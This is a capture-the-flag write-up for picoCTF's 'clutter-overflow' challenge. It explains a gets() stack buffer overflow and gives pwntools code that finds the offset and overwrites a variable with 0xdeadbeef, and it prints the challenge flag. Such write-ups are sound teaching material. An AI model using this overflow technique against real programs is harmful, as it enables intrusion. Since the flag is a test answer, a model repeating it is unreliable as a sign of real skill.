# Clutter-Overflow

## Introduction

Clutter-overflow is a 150 point binary exploitation problem from picoCTF. The description states:

> Clutter, clutter everywhere and not a byte to use.
> `nc mars.picoctf.net 31890`

We are given the source, the compiled executable, and the address:port to connect on.

## Information Gathering

No hints were given, but we do have source code.

### Vulnerability Mitigations

```shell
$ checksec chall
[*] '/home/sean/Dev/picoCTF/binary-exploitation/clutter-overflow/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```

### Static

At the top, there is a header defined obnoxiously to make some sort of ASCII art. It looks like a living room. There is only one function, `main`, and it instantiates an integer and a buffer of size 0x100 onto the stack called `clutter`, prints out the header ascii art, and calls `gets` to place user input into `clutter`. It then checks if the integer located above the `clutter` buffer on the stack is equivalent to `0xdeadbeef`. If so, the remote server will print out the flag for us.

### Dynamic

If we run the program with a simple input that will cause a segmentation error we get the following result:

```
My room is so cluttered...
What do you see?
$ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
code == 0x6161616161616161
```

Because it tells us the value of `code`, we can easily determine the offset. This means we don't even need to touch a debugger. Nice!

## Strategy

`gets` is a bad function. Even the `man` page tells you not to use it (actually). Let's send a cyclic pattern to `gets` and observe what the result of the integer `code` is. We should overwrite this value and from there we can calculate our offset to `code` on the stack. Once we know the offset, we can send `0xdeadbeef` and get our flag.

We get our offset by applying the cyclic pattern and then searching for it in the output.

```python
def calc_offset():
    '''Determine what the offset it to `code` on the stack. This is the location that we will write `0xdeadbeef`.
    '''

    # We don't want to reuse our existing process because this will cause the program to fault.
    conn = process([exe.path])

    # Generate our cyclic pattern.
    pattern = cyclic(length=NUM_CYCLIC_BYTES, n=exe.bytes)

    # Send out pattern to the program.
    conn.sendlineafter(delim=BANNER, data=pattern)

    # The program conveniently tells us what the value of `code` is after we have overwritten it, so let's parse that.
    code = conn.recvline_containsS(items='code == ')
    code = code.partition('code == 0x')[2]
    code = int(code, base=16)

    offset = cyclic_find(code, n=exe.bytes)
    log.info(f'The offset to code is : {offset}')

    return offset
```

We then tack on `0xdeadbeef` to the end, creating our payload. If we send that over to the remote server, we get the flag!

```python
# Create our payload at the offset we just learned.
    payload = fit({
        offset: MAGIC_PATTERN
    })

    # Send it!
    r.sendlineafter(delim=BANNER, data=payload)

    # Get the flag back.
    flag = r.recvline_contains(b'picoCTF')
```

And the flag is: `picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}`.
